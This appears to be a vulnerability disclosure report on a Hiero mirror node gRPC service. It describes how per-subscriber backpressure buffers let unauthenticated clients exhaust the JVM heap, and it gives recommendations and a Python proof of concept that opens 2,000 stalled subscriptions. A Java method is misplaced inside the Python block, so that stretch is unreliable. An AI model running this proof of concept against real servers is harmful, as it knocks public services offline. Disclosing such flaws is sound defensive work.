### Title
Per-Subscriber `onBackpressureBuffer` Allocation Enables Aggregate Memory Exhaustion via Unauthenticated gRPC Subscriptions

### Summary
`SharedTopicListener.listen()` applies a per-call `onBackpressureBuffer(maxBufferSize)` operator on top of the shared `Flux` returned by `RedisTopicListener.getSharedListener()`. Because each invocation of `listen()` creates an independent buffer of up to 16,384 `TopicMessage` entries, an unauthenticated attacker who opens many gRPC connections and subscribes to a high-traffic topic without consuming messages causes aggregate heap consumption proportional to the number of active subscriptions. No authentication or privilege is required to trigger this condition.

### Finding Description

**Code path:**

`SharedTopicListener.listen()` — `grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java`, lines 21–26:
```java
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    return getSharedListener(filter)
            .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
            .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
            .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
}
```

`RedisTopicListener.getSharedListener()` — `grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java`, lines 59–62:
```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
```

`subscribe()` terminates with `.share()` (line 79), meaning the upstream Redis channel subscription is shared across all subscribers to the same topic. However, `.share()` only multiplexes the upstream source; it does **not** share downstream operators. Every call to `listen()` chains a **new, independent** `onBackpressureBuffer(16384, ERROR)` operator onto the shared `Flux`. Each subscriber therefore owns a separate buffer that can hold up to 16,384 `TopicMessage` objects.

**Root cause / failed assumption:** The design assumes that sharing the upstream `Flux` via `.share()` / `computeIfAbsent` is sufficient to bound memory. It is not: the per-subscriber buffer is applied *after* the shared source, so N subscribers = N independent buffers, each up to `maxBufferSize` entries.

**Exploit flow:**
1. Attacker opens many TCP connections to the gRPC port (5600, unauthenticated).
2. Per `NettyProperties`, each connection allows up to 5 concurrent calls (`maxConcurrentCallsPerConnection = 5`). With C connections: up to 5C concurrent subscriptions.
3. Each subscription calls `listen()`, which attaches a fresh `onBackpressureBuffer(16384)`.
4. Attacker subscribes to a topic that receives a steady stream of messages but deliberately stalls consumption (e.g., by not reading from the gRPC stream).
5. Each buffer fills toward 16,384 entries. When full, `BufferOverflowStrategy.ERROR` terminates that subscriber — but by then the memory is already consumed, and the attacker simply reconnects.
6. Aggregate heap usage: `N_subscribers × 16384 × sizeof(TopicMessage)`. A `TopicMessage` carries consensus timestamps, sequence numbers, and a variable-length message payload; even at a conservative 512 bytes each, 1,000 subscribers × 16,384 entries ≈ **8 GB**.

### Impact Explanation
This is a non-network-based heap exhaustion DoS. The gRPC service runs in a single JVM; exhausting its heap causes `OutOfMemoryError`, crashing or severely degrading the mirror node's gRPC API. Because the gRPC endpoint is public and unauthenticated, any external party can trigger this. The impact is loss of availability of the consensus topic subscription service, which is a core function of the mirror node.

### Likelihood Explanation
The gRPC port is publicly exposed with no authentication. Opening thousands of TCP connections and issuing `subscribeTopic` RPCs is trivial with any gRPC client library. The attacker does not need to send any valid Hedera credentials. The only partial friction is `maxConcurrentCallsPerConnection = 5`, but this is easily bypassed by opening more connections. The attack is repeatable: after a subscriber is evicted by `BufferOverflowStrategy.ERROR`, the attacker reconnects immediately.

### Recommendation
1. **Limit total concurrent subscriptions per IP / globally** at the gRPC interceptor layer, independent of `maxConcurrentCallsPerConnection`.
2. **Move `onBackpressureBuffer` upstream** (inside `subscribe()`, before `.share()`) so the buffer is shared rather than per-subscriber, or use `onBackpressureDrop`/`onBackpressureLatest` for slow consumers instead of buffering.
3. **Cap the number of distinct subscriber `Flux` chains** per topic (e.g., reject new subscriptions when a threshold is reached).
4. **Require authentication/authorization** for topic subscriptions to raise the bar for abuse.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, mirror_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = 1234  # a high-traffic topic

def subscribe():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = mirror_pb2.ConsensusTopicQuery(topicID=..., consensusStartTime=...)
    # Subscribe but never iterate — stalls consumption, fills buffer
    it = stub.subscribeTopic(req)
    # Do not call next(it); just hold the iterator open
    import time; time.sleep(3600)

threads = []
for _ in range(2000):  # 2000 concurrent subscriptions
    t = threading.Thread(target=subscribe, daemon=True)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
# Result: gRPC JVM heap exhausted; OOM or severe GC pressure observed

    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }
```
